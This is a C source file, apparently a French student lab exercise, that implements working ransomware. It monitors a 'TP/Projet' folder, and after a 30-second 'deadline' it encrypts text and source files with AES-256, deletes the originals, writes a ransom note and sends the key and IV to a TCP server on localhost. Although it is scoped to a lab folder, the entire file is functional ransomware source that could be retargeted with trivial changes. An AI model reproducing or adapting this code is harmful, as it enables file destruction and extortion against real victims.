// TP/ransomware.c

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <dirent.h>

#include <unistd.h>

#include <sys/stat.h>

#include <openssl/evp.h>

#include <openssl/rand.h>

#include <time.h>

#include <arpa/inet.h>



#define KEY_SIZE 32

#define IV_SIZE 16

#define EXT_MAX 8

#define DEADLINE_SEC 30  // Pour test rapide : 30s



const char* EXTENSIONS[] = {".txt", ".md", ".c", ".h"};

const int NUM_EXT = 4;



int ends_with(const char* str, const char* suffix) {

    size_t len = strlen(str);

    size_t suff_len = strlen(suffix);

    if (len < suff_len) return 0;

    return strcmp(str + len - suff_len, suffix) == 0;

}



int encrypt_file(const char* filepath, unsigned char* key, unsigned char* iv) {

    FILE *in = fopen(filepath, "rb");

    if (!in) return -1;



    char outpath[512];

    snprintf(outpath, sizeof(outpath), "%s.enc", filepath);

    FILE *out = fopen(outpath, "wb");

    if (!out) { fclose(in); return -1; }



    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();

    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);



    unsigned char buffer[1024], ciphertext[1040];

    int len, cipherlen;



    while ((len = fread(buffer, 1, sizeof(buffer), in)) > 0) {

        EVP_EncryptUpdate(ctx, ciphertext, &cipherlen, buffer, len);

        fwrite(ciphertext, 1, cipherlen, out);

    }

    EVP_EncryptFinal_ex(ctx, ciphertext, &cipherlen);

    fwrite(ciphertext, 1, cipherlen, out);



    EVP_CIPHER_CTX_free(ctx);

    fclose(in); fclose(out);

    remove(filepath);

    return 0;

}



void generate_ransom_note(const char* path) {

    char filepath[512];

    snprintf(filepath, sizeof(filepath), "%s/RANÇON.txt", path);

    FILE* f = fopen(filepath, "w");

    if (!f) return;

    fprintf(f,

        "#########################################\n"

        "#        ❌  FICHIERS CHIFFRÉS  ❌       #\n"

        "#########################################\n\n"

        "Vos fichiers dans ce dossier ont été chiffrés par ProManager,\n"

        "car la date limite de remise du projet a été dépassée.\n\n"

        "Chaque fichier a été chiffré en AES-256 avec une clé unique.\n\n"

        "Ne tentez pas de modifier les fichiers `.enc`...\n\n"

        "Pour les récupérer, exécutez `client_decrypt`.\n");

    fclose(f);

}



void send_key_to_server(unsigned char* key, unsigned char* iv) {

    int sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in serv;

    serv.sin_family = AF_INET;

    serv.sin_port = htons(4242);

    inet_pton(AF_INET, "127.0.0.1", &serv.sin_addr);

    connect(sock, (struct sockaddr*)&serv, sizeof(serv));

    write(sock, key, KEY_SIZE);

    write(sock, iv, IV_SIZE);

    close(sock);

}
 
 
int main() {
    printf("[*] Surveillance du dossier TP/... \n");
 
    while (1) {
        struct stat st;
        if (stat("TP/Projet", &st) == 0 && S_ISDIR(st.st_mode)) {
            printf("[+] Dossier Projet détecté. Décompte lancé...\n");
            time_t start = time(NULL);
            while (time(NULL) - start < DEADLINE_SEC) {
                sleep(1);
            }
 
            printf("[!] Deadline dépassée. Chiffrement en cours...\n");
 
            unsigned char key[KEY_SIZE], iv[IV_SIZE];
            RAND_bytes(key, KEY_SIZE);
            RAND_bytes(iv, IV_SIZE);
 
            DIR* d = opendir("TP/Projet");
            struct dirent* f;
            char filepath[512];
            while ((f = readdir(d))) {
                if (f->d_type == DT_REG) {
                    for (int i = 0; i < NUM_EXT; i++) {
                        if (ends_with(f->d_name, EXTENSIONS[i])) {
                            snprintf(filepath, sizeof(filepath), "TP/Projet/%s", f->d_name);
                            encrypt_file(filepath, key, iv);
                            break;
                        }
                    }
                }
            }
            closedir(d);
            generate_ransom_note("TP/Projet");
            send_key_to_server(key, iv);
            break;
        }
        sleep(5);
    }
 
    return 0;
}
 
 
